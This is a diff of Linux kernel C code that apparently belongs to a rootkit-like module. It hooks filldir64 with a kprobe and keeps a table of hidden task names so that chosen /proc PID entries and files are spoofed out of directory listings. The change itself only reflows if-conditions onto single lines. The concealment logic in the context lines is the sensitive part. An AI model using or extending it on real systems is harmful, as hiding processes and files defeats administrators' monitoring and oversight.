@@ -91,9 +91,7 @@ int hide_task_name_add(const char *name) {
 
 	raw_spin_lock_irqsave(&hidden_names_lock, flags);
 	for (i = 0; i < HIDE_NAME_SLOTS; i++) {
-		if (hidden_names[i].in_use &&
-		    hidden_names[i].len == (u8)len &&
-		    memcmp(hidden_names[i].name, name, len) == 0) {
+		if (hidden_names[i].in_use && hidden_names[i].len == (u8)len && memcmp(hidden_names[i].name, name, len) == 0) {
 			raw_spin_unlock_irqrestore(&hidden_names_lock, flags);
 			return 0;
 		}
@@ -125,9 +123,7 @@ int hide_task_name_remove(const char *name) {
 
 	raw_spin_lock_irqsave(&hidden_names_lock, flags);
 	for (i = 0; i < HIDE_NAME_SLOTS; i++) {
-		if (hidden_names[i].in_use &&
-		    hidden_names[i].len == (u8)len &&
-		    memcmp(hidden_names[i].name, name, len) == 0) {
+		if (hidden_names[i].in_use && hidden_names[i].len == (u8)len && memcmp(hidden_names[i].name, name, len) == 0) {
 			memset(&hidden_names[i], 0, sizeof(hidden_names[i]));
 			rc = 0;
 			break;
@@ -193,9 +189,7 @@ static int filldir64_pre(struct kprobe *p, struct pt_regs *regs) {
 	d_type = (unsigned int)regs->regs[5];
 
 	/* PID hide path — only directories matter (proc PID entries). */
-	if (d_type == DT_DIR &&
-	    parse_pid_name(name, namlen, &candidate) &&
-	    hide_task_contains(candidate))
+	if (d_type == DT_DIR && parse_pid_name(name, namlen, &candidate) && hide_task_contains(candidate))
 		goto spoof;
 
 	/* File/dir name hide path — any dirent. */
